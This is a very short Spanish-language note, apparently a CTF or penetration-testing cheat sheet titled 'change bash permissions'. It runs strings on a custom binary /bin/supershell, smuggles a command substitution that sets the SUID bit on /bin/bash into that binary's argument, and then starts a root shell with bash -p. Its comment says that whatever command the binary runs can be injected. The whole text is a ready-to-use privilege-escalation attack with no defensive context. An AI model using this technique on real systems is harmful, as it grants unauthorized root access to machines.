
# CAMBIAR PERMISOS BASH
```shell
strings /bin/supershell #EL COMANDO QUE VEAS QUE PUEDES EJECUTAR LE PUEDES INYECTAR.
supershell '/bin/ls /$(chmod u+s /bin/bash)'
bash -p
```